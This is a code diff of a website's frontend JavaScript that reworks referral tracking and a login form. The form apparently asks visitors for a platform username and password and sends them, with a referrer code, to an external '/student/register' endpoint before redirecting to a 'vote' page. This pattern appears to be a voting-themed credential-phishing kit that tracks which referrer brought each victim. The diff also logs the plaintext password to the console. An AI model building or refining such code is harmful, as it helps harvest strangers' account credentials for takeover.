@@ -1,37 +1,57 @@
+// main.js (frontend) — full file
 import { $, $$, _$, on } from './dom.js';
 import { showFeedback } from './src/feedback.js';
 
 // ================== Navigation ==================
 function navigate() {
   const btns = $$("[data-role=nav]");
+  if (!btns || btns.length === 0) {
+    console.warn("No elements found: [data-role=nav]");
+    return;
+  }
   btns.forEach(b => {
-    on(b, "click", () => {
+    on(b, "click", (e) => {
+      // prevent default if button is inside <a> etc
+      e.preventDefault && e.preventDefault();
       const target = b.dataset.target;
       if (target) {
         // Before navigating, track visit to the next page
-        trackVisitAndGo(target);
-        window.location.href = target;
+        // trackVisitAndGo does not block navigation, but we call it to record
+        trackVisitAndGo(target).catch(()=>{});
+        // preserve referral in URL by appending ?ref=... if exists in storage
+        const ref = localStorage.getItem("refCode");
+        const url = ref ? `${target}?ref=${encodeURIComponent(ref)}` : target;
+        window.location.href = url;
       }
     });
   });
 }
 
+// ================== Referral helper ==================
+function getStoredReferral() {
+  // Only return a stored referral if it's a non-empty string and not the literal "null"
+  const val = localStorage.getItem("refCode");
+  if (!val || val === "null") return null;
+  return val;
+}
+
+function storeReferralIfPresentFromURL() {
+  const urlRef = new URLSearchParams(window.location.search).get('ref');
+  if (urlRef && urlRef !== "null") {
+    localStorage.setItem("refCode", urlRef);
+    return urlRef;
+  }
+  return null;
+}
+
 // ================== Referral & Login ==================
 function login(form) {
-  // Try getting ?ref from URL
-  let refFromURL = new URLSearchParams(window.location.search).get("ref");
-
-  // Only store new referral if it actually exists
-  if (refFromURL) {
-    localStorage.setItem("refCode", refFromURL);
-  }
-  
-
-  // Use stored ref or fallback if none found
-   const referralCode = localStorage.getItem("refCode") || "K17PWA";
+  // Pull from URL first (and persist), otherwise use stored referral
+  const refFromURL = storeReferralIfPresentFromURL();
+  const referralCode = refFromURL || getStoredReferral() || "K17PWA";
 
   // Collect login details
-  const username = form.username?.value.trim();
+  const username = form.username?.value?.trim();
   const password = form.password?.value;
   const platform = form.platform?.value;
 
@@ -44,56 +64,63 @@ function login(form) {
     return;
   }
 
-  // Payload always carries the correct referralCode
+  // Payload always carries the correct referralCode as string
   const payload = { username, password, platform, referralCode };
+
+  // pass payload to req so we can redirect using its referral
   req(form, payload);
 }
 
 // ================== API Request (Register/Login) ==================
 async function req(form, payload) {
   const button = form.querySelector("[type=submit]");
-  const originalText = button.innerHTML;
-  button.innerHTML = '<span class="spinner"></span>';
+  const originalText = button ? button.innerHTML : "Submit";
+  if (button) button.innerHTML = '<span class="spinner"></span>';
 
   try {
+    console.log("🛰️ Sending payload:", payload);
     const res = await fetch("https://nexa-mini.onrender.com/student/register", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
     });
 
-    if (!res.ok) throw new Error("Network response not ok");
+    if (!res.ok) {
+      // read raw text or json for better debugging
+      const text = await res.text();
+      throw new Error(`HTTP ${res.status} ${res.statusText} - ${text}`);
+    }
 
     const data = await res.json();
 
     if (data.success) {
-      showFeedback("Success", "You have successfully logged in", "Continue");
+      showFeedback("Success", "You have successfully registered / logged in", "Continue");
       console.log("✅ Login response:", data);
-      window.location.href = `vote.html?ref=${referralCode}`;
+      // redirect and preserve referral code in URL
+      const ref = payload.referralCode || getStoredReferral();
+      const location = ref ? `vote.html?ref=${encodeURIComponent(ref)}` : "vote.html";
+      window.location.href = location;
     } else {
       showFeedback("Login Failed", data.message || "Invalid credentials", "Retry");
     }
   } catch (e) {
-    console.error("💥 Error:", e);
-    showFeedback("Error", "Sorry, something went wrong", "Re-try");
+    console.error("💥 Error in req():", e && e.message || e);
+    // show the message (trim long messages)
+    const msg = e && e.message ? (e.message.length > 300 ? e.message.slice(0,300)+"..." : e.message) : "Sorry, something went wrong";
+    showFeedback("Error", msg, "Re-try");
   } finally {
-    button.innerHTML = originalText;
+    if (button) button.innerHTML = originalText;
   }
 }
 
 // ================== Visit Tracking ==================
 async function trackVisitAndGo(path = window.location.pathname) {
   try {
-    // Get referral from URL (if exists)
-    const urlRef = new URLSearchParams(window.location.search).get('ref');
+    // If URL contains ref, persist it
+    storeReferralIfPresentFromURL();
 
-    // Only overwrite stored ref if a real one exists in URL
-    if (urlRef) {
-      localStorage.setItem("refCode", urlRef);
-    }
-
-    // Load final referral code or fallback
-    const ref = localStorage.getItem("refCode") || "K17PWA";
+    // Final ref to send
+    const ref = getStoredReferral() || "K17PWA";
 
     const payload = {
       path,
@@ -102,26 +129,41 @@ async function trackVisitAndGo(path = window.location.pathname) {
       userAgent: navigator.userAgent
     };
 
-    await fetch('https://nexa-mini.onrender.com/student/visit', {
+    console.log("➡️ /student/visit payload:", payload);
+
+    const res = await fetch('https://nexa-mini.onrender.com/student/visit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
 
-    console.log("✅ Visit tracked:", payload);
-
+    // parse and check JSON response
+    if (!res.ok) {
+      const text = await res.text();
+      console.warn("❗ visit endpoint returned non-ok:", res.status, text);
+      return;
+    }
+    const data = await res.json();
+    console.log("✅ Visit tracked:", data);
   } catch (err) {
-    console.warn('⚠️ Visit tracking failed:', err);
+    console.warn('⚠️ Visit tracking failed:', err && err.message || err);
   }
 }
 
 // ================== Boot ==================
-window.onload = () => {
-  trackVisitAndGo(); // Track on page load
-  navigate(); // Activate navigation buttons
+window.addEventListener("DOMContentLoaded", () => {
+  // persist referral if present on initial page load
+  storeReferralIfPresentFromURL();
 
+  // track first visit
+  trackVisitAndGo().catch(()=>{});
+
+  // navigation
+  navigate();
+
+  // forms
   const forms = $$(".meta-form");
-  if (forms.length > 0) {
+  if (forms && forms.length > 0) {
     forms.forEach(form => {
       on(form, "submit", e => {
         e.preventDefault();
@@ -129,4 +171,4 @@ window.onload = () => {
       });
     });
   }
-};
+});
